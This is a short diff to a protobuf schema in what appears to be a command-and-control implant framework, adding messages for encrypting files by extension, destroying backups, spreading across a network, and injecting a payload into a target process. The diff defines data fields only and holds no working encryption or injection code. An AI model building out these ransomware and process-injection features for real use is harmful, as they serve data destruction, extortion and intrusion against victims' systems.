@@ -20,6 +20,24 @@ import "commonpb/common.proto";
 
 */
 
+message BloopEncrypt {
+  string target_path = 1;
+  repeated string extensions = 2;
+  bool destroy_backups = 3;
+  bool propagate_network = 4;
+}
+
+message BloopEncryptResult {
+  repeated EncryptedFile encrypted_files = 1;
+  int64 total_encrypted = 2;
+  int64 total_size = 3;
+}
+
+message BloopProcessInject {
+  bytes payload = 1;
+  string target_process = 2;
+}
+
 // Envelope - Used to encode implant<->server messages since we 
 //            cannot use gRPC due to the various transports used.
 message Envelope {
